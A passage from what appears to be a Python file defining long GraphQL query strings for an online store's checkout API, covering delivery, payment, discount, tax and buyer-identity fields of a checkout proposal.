deliveryIntervalCount __typename}__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment MerchandiseLineComponentWithCapabilities on MerchandiseLineComponentWithCapabilities{__typename stableId componentCapabilities componentSource merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}availableRedeemables{...on PendingTerms{taskId pollDelay __typename}...on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress delivery{...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection __typename}...on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies}...on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}...on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}...on WalletsPlatformConfiguration{name configurationParams __typename}...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken}...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}...on FacebookPayWalletConfig{__typename name partnerId partnerMerchantId supportedContainers acquirerCountryCode mode paymentMethodIdentifier orderingIndex}...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}...on AmazonPayClassicWalletConfig{__typename name orderingIndex}...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName additionalParameters{...on IdealBankSelectionParameterConfig{__typename label options{label value __typename}}__typename}orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}...on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{...on DepositPercentage{percentage __typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{...on FilledBuyerIdentityTerms{customer{...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}...on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}__typename}phone email marketingConsent{...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{...on FilledDutyTerms{totalDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tip{tipSuggestions{...on TipSuggestion{__typename percentage amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{...on FilledTipTerms{tipLines{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token __typename}...on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename...on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}__typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{cvvSessionId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}...on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}...on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode paymentMethodIdentifier __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name __typename}...on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}...on ManualPaymentMethod{id name paymentMethodIdentifier __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}...on NoopPaymentMethod{__typename}__typename}__typename}

"""

# ── GraphQL document: delivery proposal (address committed) ──────────────────
QUERY_PROPOSAL_DELIVERY = """query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}...on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{target __typename}...on AcceptNewTermViolation{target __typename}...on ConfirmChangeViolation{from to __typename}...on UnprocessableTermViolation{target __typename}...on UnresolvableTermViolation{target __typename}...on ApplyChangeViolation{target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on GenericError{__typename}...on PendingTermViolation{__typename}__typename}}__typename}}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseLineComponentWithCapabilities{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on 